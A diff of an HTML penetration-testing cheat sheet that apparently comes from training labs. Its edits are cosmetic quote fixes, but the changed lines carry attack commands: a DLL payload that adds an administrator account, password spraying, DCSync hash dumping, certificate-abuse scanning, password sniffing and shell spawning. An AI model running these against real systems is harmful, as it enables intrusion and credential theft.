-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">Get-CimInstance</span> <span class="n">-ClassName</span> <span class="n">win32_service</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">Name</span><span class="p">,</span> <span class="n">StartMode</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">Name</span> <span class="o">-like</span> <span class="s1">&#39;mysql&#39;</span><span class="p">}</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">Get-CimInstance</span> <span class="n">-ClassName</span> <span class="n">win32_service</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">Name</span><span class="p">,</span> <span class="n">StartMode</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">Name</span> <span class="o">-like</span> <span class="s1">'mysql'</span><span class="p">}</span>
 </pre></div>
 <ul>
 <li>Reboot</li>
@@ -1370,8 +1370,8 @@ PS C:\Users\dave&gt; Get-LocalGroup</span></pre></div>
 <span class="w">    </span><span class="p">{</span>
 <span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="no">DLL_PROCESS_ATTACH</span><span class="p">:</span><span class="w"> </span><span class="c1">// A process is loading the DLL.</span>
 <span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>
-<span class="w">  	    </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">system</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;net user dave3 password123! /add&quot;</span><span class="p">);</span>
-<span class="w">  	    </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">system</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;net localgroup administrators dave3 /add&quot;</span><span class="p">);</span>
+<span class="w">  	    </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">system</span><span class="w"> </span><span class="p">(</span><span class="s">"net user dave3 password123! /add"</span><span class="p">);</span>
+<span class="w">  	    </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">system</span><span class="w"> </span><span class="p">(</span><span class="s">"net localgroup administrators dave3 /add"</span><span class="p">);</span>
 <span class="w">        </span><span class="k">break</span><span class="p">;</span>
 <span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="no">DLL_THREAD_ATTACH</span><span class="p">:</span><span class="w"> </span><span class="c1">// A process is creating a new thread.</span>
 <span class="w">        </span><span class="k">break</span><span class="p">;</span>
@@ -1515,17 +1515,17 @@ crontab<span class="w"> </span>-l
 </pre></div></div></section><section class="cs-sec" id="exposed-secrets" data-intro="exposed secrets"><h2>Exposed Secrets</h2><div class="cs-sub" id="inspecting-service-footprints"><h3>Inspecting Service Footprints</h3><ul>
 <li>Run ps every second</li>
 </ul>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>watch<span class="w"> </span>-n<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="s2">&quot;ps -aux | grep pass&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>watch<span class="w"> </span>-n<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="s2">"ps -aux | grep pass"</span>
 </pre></div>
 <ul>
 <li>Filter traffic</li>
 </ul>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>sudo<span class="w"> </span>tcpdump<span class="w"> </span>-i<span class="w"> </span>lo<span class="w"> </span>-A<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">&quot;pass&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>sudo<span class="w"> </span>tcpdump<span class="w"> </span>-i<span class="w"> </span>lo<span class="w"> </span>-A<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">"pass"</span>
 </pre></div>
 <ul>
 <li>cron log</li>
 </ul>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>grep<span class="w"> </span><span class="s2">&quot;CRON&quot;</span><span class="w"> </span>/var/log/syslog
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>grep<span class="w"> </span><span class="s2">"CRON"</span><span class="w"> </span>/var/log/syslog
 </pre></div>
 <ul>
 <li>gtfobins</li>
@@ -1837,8 +1837,8 @@ sudo proxychains xfreerdp /v:172.16.5.200 /u:luiza</span></pre></div>
 <li>Find the LDAP path</li>
 </ul>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nv">$PDC</span> <span class="p">=</span> <span class="no">[System.DirectoryServices.ActiveDirectory.Domain]</span><span class="p">::</span><span class="n">GetCurrentDomain</span><span class="p">().</span><span class="n">PdcRoleOwner</span><span class="p">.</span><span class="n">Name</span>
-<span class="nv">$DN</span> <span class="p">=</span> <span class="p">(</span><span class="no">[adsi]</span><span class="s1">&#39;&#39;</span><span class="p">).</span><span class="n">distinguishedName</span> 
-<span class="nv">$LDAP</span> <span class="p">=</span> <span class="s2">&quot;LDAP://$PDC/$DN&quot;</span>
+<span class="nv">$DN</span> <span class="p">=</span> <span class="p">(</span><span class="no">[adsi]</span><span class="s1">''</span><span class="p">).</span><span class="n">distinguishedName</span> 
+<span class="nv">$LDAP</span> <span class="p">=</span> <span class="s2">"LDAP://$PDC/$DN"</span>
 <span class="nv">$LDAP</span>
 </pre></div>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="plain">PS C:\Users\stephanie&gt; powershell -ep bypass
@@ -1876,7 +1876,7 @@ LDAP://DC1.corp.com/DC=corp,DC=com</span></pre></div></div><div class="cs-sub" i
 <ul>
 <li>Enumerate a specific group</li>
 </ul>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">Get-NetGroup</span> <span class="s2">&quot;Sales Department&quot;</span> <span class="p">|</span> <span class="nb">select </span><span class="n">member</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">Get-NetGroup</span> <span class="s2">"Sales Department"</span> <span class="p">|</span> <span class="nb">select </span><span class="n">member</span>
 </pre></div>
 <ul>
 <li>Enumerate computer objects</li>
@@ -1936,12 +1936,12 @@ LDAP://DC1.corp.com/DC=corp,DC=com</span></pre></div></div><div class="cs-sub" i
 <ul>
 <li>Enumerate the ACL for a management group</li>
 </ul>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">Get-ObjectAcl</span> <span class="n">-Identity</span> <span class="s2">&quot;Management Department&quot;</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">ActiveDirectoryRights</span> <span class="o">-eq</span> <span class="s2">&quot;GenericAll&quot;</span><span class="p">}</span> <span class="p">|</span> <span class="nb">select </span><span class="n">SecurityIdentifier</span><span class="p">,</span><span class="n">ActiveDirectoryRights</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">Get-ObjectAcl</span> <span class="n">-Identity</span> <span class="s2">"Management Department"</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">ActiveDirectoryRights</span> <span class="o">-eq</span> <span class="s2">"GenericAll"</span><span class="p">}</span> <span class="p">|</span> <span class="nb">select </span><span class="n">SecurityIdentifier</span><span class="p">,</span><span class="n">ActiveDirectoryRights</span>
 </pre></div>
 <ul>
 <li>Convert every SID that has GenericAll on the management group</li>
 </ul>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="s2">&quot;S-1-5-21-1987370270-658905905-1781884369-512&quot;</span><span class="p">,</span><span class="s2">&quot;S-1-5-21-1987370270-658905905-1781884369-1104&quot;</span><span class="p">,</span><span class="s2">&quot;S-1-5-32-548&quot;</span><span class="p">,</span><span class="s2">&quot;S-1-5-18&quot;</span><span class="p">,</span><span class="s2">&quot;S-1-5-21-1987370270-658905905-1781884369-519&quot;</span> <span class="p">|</span> <span class="nb">Convert-SidToName</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="s2">"S-1-5-21-1987370270-658905905-1781884369-512"</span><span class="p">,</span><span class="s2">"S-1-5-21-1987370270-658905905-1781884369-1104"</span><span class="p">,</span><span class="s2">"S-1-5-32-548"</span><span class="p">,</span><span class="s2">"S-1-5-18"</span><span class="p">,</span><span class="s2">"S-1-5-21-1987370270-658905905-1781884369-519"</span> <span class="p">|</span> <span class="nb">Convert-SidToName</span>
 </pre></div></div><div class="cs-sub" id="domain-share-enumeration"><h3>Domain share enumeration</h3><ul>
 <li>Query domain shares with PowerView</li>
 </ul>
@@ -1956,7 +1956,7 @@ LDAP://DC1.corp.com/DC=corp,DC=com</span></pre></div></div><div class="cs-sub" i
 <li>Run SharpHound to collect domain data</li>
 </ul>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">Invoke-BloodHound</span> <span class="n">-CollectionMethod</span> <span class="n">All</span> <span class="n">-OutputDirectory</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">stephanie</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span>
-</pre></div></div><div class="cs-sub" id="collecting-data-with-bloodhound-py"><h3>Collecting data with BloodHound.py</h3><div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>sudo<span class="w"> </span>bloodhound-python<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;forend&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Klmcargo2&#39;</span><span class="w"> </span>-ns<span class="w"> </span><span class="m">172</span>.16.5.5<span class="w"> </span>-d<span class="w"> </span>inlanefreight.local<span class="w"> </span>-c<span class="w"> </span>all
+</pre></div></div><div class="cs-sub" id="collecting-data-with-bloodhound-py"><h3>Collecting data with BloodHound.py</h3><div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>sudo<span class="w"> </span>bloodhound-python<span class="w"> </span>-u<span class="w"> </span><span class="s1">'forend'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'Klmcargo2'</span><span class="w"> </span>-ns<span class="w"> </span><span class="m">172</span>.16.5.5<span class="w"> </span>-d<span class="w"> </span>inlanefreight.local<span class="w"> </span>-c<span class="w"> </span>all
 </pre></div></div><div class="cs-sub" id="analysing-data-with-bloodhound"><h3>Analysing data with BloodHound</h3><ul>
 <li>Install Docker</li>
 </ul>
@@ -2008,7 +2008,7 @@ privilege::debug</span></pre></div>
 <ul>
 <li>Password spray with netexec</li>
 </ul>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>netexec<span class="w"> </span>smb<span class="w"> </span><span class="m">192</span>.168.50.75<span class="w"> </span>-u<span class="w"> </span>users.txt<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Nexus123!&#39;</span><span class="w"> </span>-d<span class="w"> </span>corp.com<span class="w"> </span>--continue-on-success
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>netexec<span class="w"> </span>smb<span class="w"> </span><span class="m">192</span>.168.50.75<span class="w"> </span>-u<span class="w"> </span>users.txt<span class="w"> </span>-p<span class="w"> </span><span class="s1">'Nexus123!'</span><span class="w"> </span>-d<span class="w"> </span>corp.com<span class="w"> </span>--continue-on-success
 </pre></div></div><div class="cs-sub" id="as-rep-roasting"><h3>AS-REP Roasting</h3><p>An attack against accounts with Kerberos "pre-authentication" disabled: obtain the AS-REP response without a password and crack it offline.</p>
 <p>Requires only a domain user account.</p>
 <ul>
@@ -2086,7 +2086,7 @@ lsadump::dcsync /user:corp\dave</span></pre></div>
 <ul>
 <li>Perform a dcsync attack with secretsdump to obtain dave's NTLM hash</li>
 </ul>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>impacket-secretsdump<span class="w"> </span>-just-dc-user<span class="w"> </span>dave<span class="w"> </span>corp.com/jeffadmin:<span class="s2">&quot;BrouhahaTungPerorateBroom2023\!&quot;</span>@192.168.50.70
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>impacket-secretsdump<span class="w"> </span>-just-dc-user<span class="w"> </span>dave<span class="w"> </span>corp.com/jeffadmin:<span class="s2">"BrouhahaTungPerorateBroom2023\!"</span>@192.168.50.70
 </pre></div></div></section></section>
 <section class="cs-group"><h1 id="active-directory-lateral-movement">Active Directory Lateral Movement</h1><section class="cs-sec" id="ad-lateral-movement-techniques" data-intro="ad lateral movement techniques"><h2>AD Lateral Movement Techniques</h2><div class="cs-sub" id="wmi-and-winrm"><h3>WMI and WinRM</h3><ul>
 <li>wmic command (port 135)</li>
@@ -2158,7 +2158,7 @@ ps -ef | grep -i "winbind\|sssd"</span></pre></div>
 <ul>
 <li>Find keytabs</li>
 </ul>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>find<span class="w"> </span>/<span class="w"> </span>-name<span class="w"> </span><span class="s1">&#39;*keytab*&#39;</span><span class="w"> </span>-ls<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>find<span class="w"> </span>/<span class="w"> </span>-name<span class="w"> </span><span class="s1">'*keytab*'</span><span class="w"> </span>-ls<span class="w"> </span><span class="m">2</span>&gt;/dev/null
 </pre></div>
 <ul>
 <li>Inspect keytab information</li>
@@ -2299,7 +2299,7 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 </ul>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>raiseChild.py<span class="w"> </span>-target-exec<span class="w"> </span><span class="m">172</span>.16.5.5<span class="w"> </span>LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
 </pre></div></div></section><section class="cs-sec" id="active-directory-privilege-escalation" data-intro="active directory privilege escalation"><h2>Active Directory Privilege Escalation</h2><div class="cs-sub" id="vulnerability-scanning-with-certipy-ad"><h3>Vulnerability scanning with certipy-ad</h3><div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="c1"># Scan for vulnerabilities</span>
-certipy-ad<span class="w"> </span>find<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;Ryan.Cooper&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;NuclearMosquito3&#39;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.129.8.240<span class="w"> </span>-target-ip<span class="w"> </span><span class="m">10</span>.129.8.240<span class="w"> </span>-vulnerable
+certipy-ad<span class="w"> </span>find<span class="w"> </span>-u<span class="w"> </span><span class="s1">'Ryan.Cooper'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'NuclearMosquito3'</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.129.8.240<span class="w"> </span>-target-ip<span class="w"> </span><span class="m">10</span>.129.8.240<span class="w"> </span>-vulnerable
 <span class="c1"># Review the findings</span>
 cat<span class="w"> </span>20260216030602_Certipy.txt
 </pre></div></div></section></section>
@@ -2307,8 +2307,8 @@ cat<span class="w"> </span>20260216030602_Certipy.txt
 <li>shell spawning</li>
 </ul>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>script<span class="w"> </span>-qc<span class="w"> </span>/bin/bash<span class="w"> </span>/dev/null
-python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
-python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
+python<span class="w"> </span>-c<span class="w"> </span><span class="s1">'import pty; pty.spawn("/bin/sh")'</span>
+python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">'import pty; pty.spawn("/bin/sh")'</span>
 </pre></div>
 <ul>
 <li>Get a full TTY shell</li>
@@ -2365,7 +2365,7 @@ The command completed successfully.</span></pre></div>
 <ul>
 <li>Connect over RDP</li>
 </ul>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>xfreerdp3<span class="w"> </span>/v:&lt;IP&gt;<span class="w"> </span>/u:&lt;USERNAME&gt;<span class="w"> </span>/p:<span class="s1">&#39;&lt;PASSWORD&gt;&#39;</span><span class="w"> </span>+clipboard<span class="w"> </span>/dynamic-resolution
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>xfreerdp3<span class="w"> </span>/v:&lt;IP&gt;<span class="w"> </span>/u:&lt;USERNAME&gt;<span class="w"> </span>/p:<span class="s1">'&lt;PASSWORD&gt;'</span><span class="w"> </span>+clipboard<span class="w"> </span>/dynamic-resolution
 </pre></div></div></section><section class="cs-sec" id="custom-wordlists" data-intro="custom wordlists"><h2>Custom Wordlists</h2><div class="cs-sub" id="username-anarchy"><h3>username-anarchy</h3><ul>
 <li>install</li>
 </ul>
